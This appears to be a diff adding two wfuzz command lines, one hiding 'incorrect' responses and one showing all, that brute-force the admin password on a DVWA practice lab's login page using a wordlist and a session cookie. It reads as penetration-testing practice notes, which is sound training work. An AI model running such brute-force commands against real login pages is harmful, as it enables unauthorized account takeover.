@@ -1,0 +1,4 @@
+HIDE "INCORRECT"
+wfuzz --hs "incorrect" -c -z file,BRUTEFORCE.txt -b 'security=low; PHPSESSID=md8b46s1b16s8rctje3suvcnl3' 'http://192.168.0.247/DVWA/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login'
+SHOW ALL
+wfuzz -c -z file,BRUTEFORCE.txt -b 'security=low; PHPSESSID=md8b46s1b16s8rctje3suvcnl3' 'http://192.168.0.247/DVWA/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login'
